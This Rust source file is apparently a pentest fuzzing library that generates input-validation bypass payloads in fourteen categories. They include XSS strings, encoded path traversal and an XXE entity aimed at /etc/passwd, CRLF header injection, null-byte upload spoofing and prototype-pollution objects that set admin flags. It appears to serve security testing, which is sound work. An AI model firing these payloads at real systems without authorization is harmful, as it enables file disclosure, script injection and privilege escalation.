/// Input validation bypass payload generator.
///
/// Produces payloads that defeat common server-side and client-side input validation:
/// type juggling, length boundary abuse, charset confusion (unicode homoglyphs, fullwidth),
/// encoding chains, null byte injection, array/object parameter injection, scientific
/// notation abuse, negative-number unsigned-field bypass, empty/null/missing parameter
/// confusion, multiline regex bypass, JSON/XML type confusion, and prototype pollution
/// primitives. Fourteen distinct bypass categories with per-type generation.
use std::fmt;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ValidationBypassCategory {
    TypeJuggling,
    LengthBoundary,
    CharsetConfusable,
    EncodingChain,
    NullByteInjection,
    ArrayObjectInjection,
    ScientificNotation,
    NegativeUnsigned,
    EmptyNullMissing,
    MultilineRegexBypass,
    JsonXmlTypeConfusion,
    PrototypePollution,
    UnicodeNormalization,
    CaseMappingTrick,
}

impl ValidationBypassCategory {
    pub fn all() -> &'static [ValidationBypassCategory] {
        &[
            Self::TypeJuggling,
            Self::LengthBoundary,
            Self::CharsetConfusable,
            Self::EncodingChain,
            Self::NullByteInjection,
            Self::ArrayObjectInjection,
            Self::ScientificNotation,
            Self::NegativeUnsigned,
            Self::EmptyNullMissing,
            Self::MultilineRegexBypass,
            Self::JsonXmlTypeConfusion,
            Self::PrototypePollution,
            Self::UnicodeNormalization,
            Self::CaseMappingTrick,
        ]
    }

    pub fn risk_score(self) -> f64 {
        match self {
            Self::TypeJuggling => 7.5,
            Self::LengthBoundary => 5.0,
            Self::CharsetConfusable => 7.0,
            Self::EncodingChain => 8.0,
            Self::NullByteInjection => 9.0,
            Self::ArrayObjectInjection => 7.0,
            Self::ScientificNotation => 5.5,
            Self::NegativeUnsigned => 6.0,
            Self::EmptyNullMissing => 4.5,
            Self::MultilineRegexBypass => 7.5,
            Self::JsonXmlTypeConfusion => 8.0,
            Self::PrototypePollution => 9.0,
            Self::UnicodeNormalization => 7.5,
            Self::CaseMappingTrick => 6.5,
        }
    }
}

impl fmt::Display for ValidationBypassCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::TypeJuggling => write!(f, "Type Juggling"),
            Self::LengthBoundary => write!(f, "Length Boundary"),
            Self::CharsetConfusable => write!(f, "Charset Confusable"),
            Self::EncodingChain => write!(f, "Encoding Chain"),
            Self::NullByteInjection => write!(f, "Null Byte Injection"),
            Self::ArrayObjectInjection => write!(f, "Array/Object Injection"),
            Self::ScientificNotation => write!(f, "Scientific Notation"),
            Self::NegativeUnsigned => write!(f, "Negative Unsigned"),
            Self::EmptyNullMissing => write!(f, "Empty/Null/Missing"),
            Self::MultilineRegexBypass => write!(f, "Multiline Regex Bypass"),
            Self::JsonXmlTypeConfusion => write!(f, "JSON/XML Type Confusion"),
            Self::PrototypePollution => write!(f, "Prototype Pollution"),
            Self::UnicodeNormalization => write!(f, "Unicode Normalization"),
            Self::CaseMappingTrick => write!(f, "Case Mapping Trick"),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct ValidationBypassPayload {
    pub payload: String,
    pub category: ValidationBypassCategory,
    pub description: String,
    pub target_field_type: FieldType,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum FieldType {
    String,
    Integer,
    Boolean,
    Email,
    Url,
    Filename,
    Json,
    Xml,
    Any,
}

impl fmt::Display for FieldType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::String => write!(f, "string"),
            Self::Integer => write!(f, "integer"),
            Self::Boolean => write!(f, "boolean"),
            Self::Email => write!(f, "email"),
            Self::Url => write!(f, "url"),
            Self::Filename => write!(f, "filename"),
            Self::Json => write!(f, "json"),
            Self::Xml => write!(f, "xml"),
            Self::Any => write!(f, "any"),
        }
    }
}

pub struct ValidationBypassGenerator;

impl ValidationBypassGenerator {
    pub fn generate_all() -> Vec<ValidationBypassPayload> {
        let mut payloads = Vec::new();
        payloads.extend(Self::type_juggling());
        payloads.extend(Self::length_boundary());
        payloads.extend(Self::charset_confusable());
        payloads.extend(Self::encoding_chain());
        payloads.extend(Self::null_byte_injection());
        payloads.extend(Self::array_object_injection());
        payloads.extend(Self::scientific_notation());
        payloads.extend(Self::negative_unsigned());
        payloads.extend(Self::empty_null_missing());
        payloads.extend(Self::multiline_regex_bypass());
        payloads.extend(Self::json_xml_type_confusion());
        payloads.extend(Self::prototype_pollution());
        payloads.extend(Self::unicode_normalization());
        payloads.extend(Self::case_mapping_trick());
        payloads
    }

    pub fn generate_for_category(
        category: ValidationBypassCategory,
    ) -> Vec<ValidationBypassPayload> {
        match category {
            ValidationBypassCategory::TypeJuggling => Self::type_juggling(),
            ValidationBypassCategory::LengthBoundary => Self::length_boundary(),
            ValidationBypassCategory::CharsetConfusable => Self::charset_confusable(),
            ValidationBypassCategory::EncodingChain => Self::encoding_chain(),
            ValidationBypassCategory::NullByteInjection => Self::null_byte_injection(),
            ValidationBypassCategory::ArrayObjectInjection => Self::array_object_injection(),
            ValidationBypassCategory::ScientificNotation => Self::scientific_notation(),
            ValidationBypassCategory::NegativeUnsigned => Self::negative_unsigned(),
            ValidationBypassCategory::EmptyNullMissing => Self::empty_null_missing(),
            ValidationBypassCategory::MultilineRegexBypass => Self::multiline_regex_bypass(),
            ValidationBypassCategory::JsonXmlTypeConfusion => Self::json_xml_type_confusion(),
            ValidationBypassCategory::PrototypePollution => Self::prototype_pollution(),
            ValidationBypassCategory::UnicodeNormalization => Self::unicode_normalization(),
            ValidationBypassCategory::CaseMappingTrick => Self::case_mapping_trick(),
        }
    }

    pub fn generate_for_field_type(field_type: FieldType) -> Vec<ValidationBypassPayload> {
        Self::generate_all()
            .into_iter()
            .filter(|p| p.target_field_type == field_type || p.target_field_type == FieldType::Any)
            .collect()
    }

    pub fn type_juggling() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "0".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "string zero — falsy in PHP/JS loose comparison".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "false".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "boolean string — loose equality with 0 in PHP".into(),
                target_field_type: FieldType::Boolean,
            },
            ValidationBypassPayload {
                payload: "null".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "null string — bypasses isset() checks in PHP".into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "[]".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "empty array literal — truthy in JS, type mismatch in PHP".into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "\"\"".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "empty string in quotes — bypasses empty() but not strlen".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "0e999999".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "PHP magic hash — loosely equals 0 as scientific notation".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "true".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "boolean true string — equals 1 in loose comparison".into(),
                target_field_type: FieldType::Boolean,
            },
            ValidationBypassPayload {
                payload: "NaN".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "NaN — not equal to itself, breaks equality checks".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "undefined".into(),
                category: ValidationBypassCategory::TypeJuggling,
                description: "undefined string — loose equals null in JS".into(),
                target_field_type: FieldType::Any,
            },
        ]
    }

    pub fn length_boundary() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "A".repeat(255),
                category: ValidationBypassCategory::LengthBoundary,
                description: "exactly 255 chars — common TINYTEXT/VARCHAR boundary".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "A".repeat(256),
                category: ValidationBypassCategory::LengthBoundary,
                description: "256 chars — off-by-one past TINYTEXT limit".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "A".repeat(65535),
                category: ValidationBypassCategory::LengthBoundary,
                description: "65535 chars — TEXT column max, uint16 boundary".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{200B}".repeat(50),
                category: ValidationBypassCategory::LengthBoundary,
                description: "50 zero-width spaces — zero visible length, nonzero byte length"
                    .into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: format!("A{}B", "\u{0000}".repeat(10)),
                category: ValidationBypassCategory::LengthBoundary,
                description: "null bytes padding — C strlen sees 1, real length is 12".into(),
                target_field_type: FieldType::String,
            },
        ]
    }

    pub fn charset_confusable() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "\u{FF41}\u{FF44}\u{FF4D}\u{FF49}\u{FF4E}".into(),
                category: ValidationBypassCategory::CharsetConfusable,
                description: "fullwidth 'admin' — bypasses ASCII keyword filters".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{0430}dmin".into(),
                category: ValidationBypassCategory::CharsetConfusable,
                description: "cyrillic 'a' + latin 'dmin' — homoglyph IDN attack".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "scr\u{0131}pt".into(),
                category: ValidationBypassCategory::CharsetConfusable,
                description: "dotless-i in 'script' — uppercases to 'SCRIPT' in Turkish locale"
                    .into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{FF1C}script\u{FF1E}".into(),
                category: ValidationBypassCategory::CharsetConfusable,
                description: "fullwidth angle brackets — bypass < > HTML filters".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "t\u{0435}st@\u{0435}xample.com".into(),
                category: ValidationBypassCategory::CharsetConfusable,
                description: "cyrillic 'e' in email — passes format check, different domain".into(),
                target_field_type: FieldType::Email,
            },
            ValidationBypassPayload {
                payload: "\u{2215}etc\u{2215}passwd".into(),
                category: ValidationBypassCategory::CharsetConfusable,
                description: "division slash U+2215 instead of / — path traversal homoglyph".into(),
                target_field_type: FieldType::Filename,
            },
        ]
    }

    pub fn encoding_chain() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "%253Cscript%253E".into(),
                category: ValidationBypassCategory::EncodingChain,
                description: "double URL-encoded <script> — single decode leaves %3C".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "%25252e%25252e%25252f".into(),
                category: ValidationBypassCategory::EncodingChain,
                description: "triple-encoded ../ — survives two decode passes".into(),
                target_field_type: FieldType::Filename,
            },
            ValidationBypassPayload {
                payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;".into(),
                category: ValidationBypassCategory::EncodingChain,
                description: "HTML hex entities for angle brackets — bypasses URL decoder".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\\u003cscript\\u003e".into(),
                category: ValidationBypassCategory::EncodingChain,
                description: "JSON unicode escapes for <script> — parsed by JSON.parse".into(),
                target_field_type: FieldType::Json,
            },
            ValidationBypassPayload {
                payload: "%c0%ae%c0%ae%c0%af".into(),
                category: ValidationBypassCategory::EncodingChain,
                description: "overlong UTF-8 ../ — IIS/old Java path traversal".into(),
                target_field_type: FieldType::Filename,
            },
            ValidationBypassPayload {
                payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==".into(),
                category: ValidationBypassCategory::EncodingChain,
                description: "base64 data URI wrapping <script> — bypasses content filters".into(),
                target_field_type: FieldType::Url,
            },
        ]
    }

    pub fn null_byte_injection() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "admin%00.jpg".into(),
                category: ValidationBypassCategory::NullByteInjection,
                description: "null byte before extension — C sees 'admin', validator sees .jpg"
                    .into(),
                target_field_type: FieldType::Filename,
            },
            ValidationBypassPayload {
                payload: "../../etc/passwd%00.png".into(),
                category: ValidationBypassCategory::NullByteInjection,
                description: "path traversal + null byte + safe extension".into(),
                target_field_type: FieldType::Filename,
            },
            ValidationBypassPayload {
                payload: "test%00<script>alert(1)</script>".into(),
                category: ValidationBypassCategory::NullByteInjection,
                description: "null byte XSS — validator stops at null, browser continues".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "%00admin".into(),
                category: ValidationBypassCategory::NullByteInjection,
                description: "leading null byte — may bypass keyword blocklist scan".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "file.php%00.txt".into(),
                category: ValidationBypassCategory::NullByteInjection,
                description: "null truncation for extension spoofing — classic file upload bypass"
                    .into(),
                target_field_type: FieldType::Filename,
            },
        ]
    }

    pub fn array_object_injection() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "param[]=value".into(),
                category: ValidationBypassCategory::ArrayObjectInjection,
                description: "array notation — string validation fails on array type".into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "param[0]=admin&param[1]=user".into(),
                category: ValidationBypassCategory::ArrayObjectInjection,
                description: "indexed array — may bypass single-value allowlist".into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "user[role]=admin".into(),
                category: ValidationBypassCategory::ArrayObjectInjection,
                description: "nested object — mass assignment through query params".into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "data={\"admin\":true}".into(),
                category: ValidationBypassCategory::ArrayObjectInjection,
                description: "JSON in query param — backend may auto-parse to object".into(),
                target_field_type: FieldType::Json,
            },
            ValidationBypassPayload {
                payload: "ids[]=1&ids[]=2&ids[]=9999".into(),
                category: ValidationBypassCategory::ArrayObjectInjection,
                description: "array param with out-of-bounds ID — IDOR via array injection".into(),
                target_field_type: FieldType::Integer,
            },
        ]
    }

    pub fn scientific_notation() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "1e10".into(),
                category: ValidationBypassCategory::ScientificNotation,
                description: "10 billion via scientific notation — bypasses digit-count checks"
                    .into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "9.99e99".into(),
                category: ValidationBypassCategory::ScientificNotation,
                description: "huge float via notation — overflow when cast to integer".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "0e0".into(),
                category: ValidationBypassCategory::ScientificNotation,
                description: "scientific zero — equals 0 but passes regex '^[0-9e]+$'".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "1e-99".into(),
                category: ValidationBypassCategory::ScientificNotation,
                description: "near-zero via negative exponent — truncates to 0 on cast".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "0x1A".into(),
                category: ValidationBypassCategory::ScientificNotation,
                description: "hex literal 26 — parseInt('0x1A') succeeds, isNaN fails".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "Infinity".into(),
                category: ValidationBypassCategory::ScientificNotation,
                description: "JS Infinity — typeof number but breaks arithmetic checks".into(),
                target_field_type: FieldType::Integer,
            },
        ]
    }

    pub fn negative_unsigned() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "-1".into(),
                category: ValidationBypassCategory::NegativeUnsigned,
                description: "negative one — wraps to MAX_UINT in unsigned contexts".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "-0".into(),
                category: ValidationBypassCategory::NegativeUnsigned,
                description:
                    "negative zero — distinct from +0 in IEEE 754, edge case in comparisons".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "-2147483649".into(),
                category: ValidationBypassCategory::NegativeUnsigned,
                description: "below INT32_MIN — integer underflow on 32-bit signed".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "4294967295".into(),
                category: ValidationBypassCategory::NegativeUnsigned,
                description: "UINT32_MAX — wraps to -1 when cast to signed int32".into(),
                target_field_type: FieldType::Integer,
            },
            ValidationBypassPayload {
                payload: "-9999999".into(),
                category: ValidationBypassCategory::NegativeUnsigned,
                description: "large negative for quantity/price — negative purchase amount".into(),
                target_field_type: FieldType::Integer,
            },
        ]
    }

    pub fn empty_null_missing() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "".into(),
                category: ValidationBypassCategory::EmptyNullMissing,
                description: "empty string — may pass required check if whitespace-only is ok"
                    .into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "   ".into(),
                category: ValidationBypassCategory::EmptyNullMissing,
                description: "whitespace only — passes strlen > 0 but empty after trim".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\t\n\r".into(),
                category: ValidationBypassCategory::EmptyNullMissing,
                description: "control characters only — non-empty but invisible content".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "null".into(),
                category: ValidationBypassCategory::EmptyNullMissing,
                description: "literal null string — JSON.parse or YAML may convert to null type"
                    .into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "\u{FEFF}".into(),
                category: ValidationBypassCategory::EmptyNullMissing,
                description: "BOM character only — zero visible width, nonzero length".into(),
                target_field_type: FieldType::String,
            },
        ]
    }

    pub fn multiline_regex_bypass() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "safe\n<script>alert(1)</script>".into(),
                category: ValidationBypassCategory::MultilineRegexBypass,
                description: "newline injection — ^safe$ matches first line, payload on second"
                    .into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "valid\r\ninjected: header".into(),
                category: ValidationBypassCategory::MultilineRegexBypass,
                description: "CRLF injection — HTTP header splitting via multiline input".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "ok\x0bmalicious".into(),
                category: ValidationBypassCategory::MultilineRegexBypass,
                description: "vertical tab — alternate line separator not caught by \\n filter"
                    .into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "clean\u{2028}evil()".into(),
                category: ValidationBypassCategory::MultilineRegexBypass,
                description: "unicode line separator U+2028 — JS line terminator, invisible".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "normal\u{2029}<img onerror=alert(1)>".into(),
                category: ValidationBypassCategory::MultilineRegexBypass,
                description: "unicode paragraph separator U+2029 — another hidden line break"
                    .into(),
                target_field_type: FieldType::String,
            },
        ]
    }

    pub fn json_xml_type_confusion() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "{\"admin\":true}".into(),
                category: ValidationBypassCategory::JsonXmlTypeConfusion,
                description: "boolean true in JSON — bypasses string 'true' blocklist".into(),
                target_field_type: FieldType::Json,
            },
            ValidationBypassPayload {
                payload: "{\"id\":1,\"id\":9999}".into(),
                category: ValidationBypassCategory::JsonXmlTypeConfusion,
                description: "duplicate key — last-wins semantics bypass first-key validation".into(),
                target_field_type: FieldType::Json,
            },
            ValidationBypassPayload {
                payload: "{\"role\":\"user\",\"__proto__\":{\"role\":\"admin\"}}".into(),
                category: ValidationBypassCategory::JsonXmlTypeConfusion,
                description: "JSON prototype pollution via __proto__ key".into(),
                target_field_type: FieldType::Json,
            },
            ValidationBypassPayload {
                payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>".into(),
                category: ValidationBypassCategory::JsonXmlTypeConfusion,
                description: "XXE in XML body — type confusion when endpoint accepts both".into(),
                target_field_type: FieldType::Xml,
            },
            ValidationBypassPayload {
                payload: "{\"amount\":\"1000\",\"amount\":1}".into(),
                category: ValidationBypassCategory::JsonXmlTypeConfusion,
                description: "string then int duplicate — validator sees string, parser uses int".into(),
                target_field_type: FieldType::Json,
            },
            ValidationBypassPayload {
                payload: "<![CDATA[<script>alert(1)</script>]]>".into(),
                category: ValidationBypassCategory::JsonXmlTypeConfusion,
                description: "CDATA wrapped XSS — escapes XML text node filtering".into(),
                target_field_type: FieldType::Xml,
            },
        ]
    }

    pub fn prototype_pollution() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "__proto__[isAdmin]=true".into(),
                category: ValidationBypassCategory::PrototypePollution,
                description: "__proto__ via query string — pollutes Object.prototype".into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "constructor[prototype][isAdmin]=true".into(),
                category: ValidationBypassCategory::PrototypePollution,
                description: "constructor.prototype path — alternate prototype access".into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "{\"__proto__\":{\"admin\":true}}".into(),
                category: ValidationBypassCategory::PrototypePollution,
                description: "JSON body __proto__ — lodash.merge and similar are vulnerable".into(),
                target_field_type: FieldType::Json,
            },
            ValidationBypassPayload {
                payload: "constructor.prototype.toString".into(),
                category: ValidationBypassCategory::PrototypePollution,
                description: "toString override — can cause type coercion exploits".into(),
                target_field_type: FieldType::Any,
            },
            ValidationBypassPayload {
                payload: "{\"constructor\":{\"prototype\":{\"polluted\":true}}}".into(),
                category: ValidationBypassCategory::PrototypePollution,
                description: "nested constructor.prototype in JSON — deep merge pollution".into(),
                target_field_type: FieldType::Json,
            },
        ]
    }

    pub fn unicode_normalization() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "\u{FE64}script\u{FE65}".into(),
                category: ValidationBypassCategory::UnicodeNormalization,
                description: "small form variants of < > — normalize to angle brackets under NFKC"
                    .into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{2100}".into(),
                category: ValidationBypassCategory::UnicodeNormalization,
                description: "account-of symbol — NFKC normalizes to 'a/c'".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{00E9}".into(),
                category: ValidationBypassCategory::UnicodeNormalization,
                description:
                    "precomposed e-acute — different bytes than decomposed e + combining acute"
                        .into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "e\u{0301}".into(),
                category: ValidationBypassCategory::UnicodeNormalization,
                description:
                    "decomposed e + combining acute — same glyph, different bytes than U+00E9"
                        .into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{037E}".into(),
                category: ValidationBypassCategory::UnicodeNormalization,
                description:
                    "greek question mark U+037E — looks like semicolon, different codepoint".into(),
                target_field_type: FieldType::String,
            },
        ]
    }

    pub fn case_mapping_trick() -> Vec<ValidationBypassPayload> {
        vec![
            ValidationBypassPayload {
                payload: "ADMIN".into(),
                category: ValidationBypassCategory::CaseMappingTrick,
                description: "uppercase — bypasses lowercase-only comparison without case fold".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "Admin".into(),
                category: ValidationBypassCategory::CaseMappingTrick,
                description: "mixed case — bypasses exact match on 'admin'".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{0130}".into(),
                category: ValidationBypassCategory::CaseMappingTrick,
                description: "Latin capital I with dot above — lowercases to 'i' in English, different in Turkish".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{00DF}".into(),
                category: ValidationBypassCategory::CaseMappingTrick,
                description: "German sharp-s — uppercases to 'SS', changes string length".into(),
                target_field_type: FieldType::String,
            },
            ValidationBypassPayload {
                payload: "\u{FB01}le".into(),
                category: ValidationBypassCategory::CaseMappingTrick,
                description: "fi ligature + 'le' — NFKC expands to 'file', bypasses keyword filter".into(),
                target_field_type: FieldType::Filename,
            },
        ]
    }
}
